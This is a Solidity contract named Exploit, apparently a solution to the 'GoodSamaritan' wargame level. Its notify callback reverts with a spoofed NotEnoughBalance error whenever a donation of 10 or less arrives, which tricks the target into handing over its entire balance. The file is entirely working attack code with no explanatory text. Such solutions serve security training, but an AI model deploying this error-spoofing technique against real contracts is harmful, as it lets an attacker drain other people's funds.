// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface GoodSamaritan {
    function requestDonation() external returns(bool);
}

contract Exploit {
  address donor;
  error NotEnoughBalance();

  constructor(address _addr) public {
      donor = _addr;
  }

  function call() public {
      bool enoughBalance;
      enoughBalance = GoodSamaritan(donor).requestDonation();
  }

  function notify(uint256 amount) external {
    if (amount <= 10) {
        revert NotEnoughBalance();
    }
  }

}